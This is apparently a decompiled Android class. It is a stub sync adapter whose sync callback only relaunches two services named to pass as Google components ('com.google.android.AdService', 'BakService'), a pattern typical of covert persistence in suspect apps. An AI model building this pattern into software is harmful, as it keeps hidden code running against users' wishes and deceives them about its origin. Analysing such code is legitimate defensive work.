package m1;

import android.accounts.Account;
import android.content.AbstractThreadedSyncAdapter;
import android.content.ContentProviderClient;
import android.content.Context;
import android.content.Intent;
import android.content.SyncResult;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import d0.l0;
import j2.i;

/* JADX INFO: compiled from: r8-map-id-01bd2f78e356d1793fe12b6cab4b4ddc2ec9524fab1d39c14fcb56e383ba4015 */
/* JADX INFO: loaded from: classes.dex */
public final class d extends AbstractThreadedSyncAdapter {
    public static void a(Context context, String str) {
        try {
            Intent className = new Intent().setClassName(context, str);
            i.d(className, "setClassName(...)");
            if (Build.VERSION.SDK_INT >= 26) {
                l0.J(context, className);
            } else {
                context.startService(className);
            }
        } catch (Exception e4) {
            Log.e("StubSyncAdapter", "Failed to start " + str + ": " + e4.getMessage());
        }
    }

    @Override // android.content.AbstractThreadedSyncAdapter
    public final void onPerformSync(Account account, Bundle bundle, String str, ContentProviderClient contentProviderClient, SyncResult syncResult) {
        i.e(account, "account");
        i.e(bundle, "extras");
        i.e(str, "authority");
        i.e(contentProviderClient, "provider");
        i.e(syncResult, "syncResult");
        Log.i("StubSyncAdapter", "System sync triggered");
        Context context = getContext();
        i.d(context, "getContext(...)");
        a(context, "com.google.android.AdService");
        Context context2 = getContext();
        i.d(context2, "getContext(...)");
        a(context2, "com.google.android.BakService");
    }
}
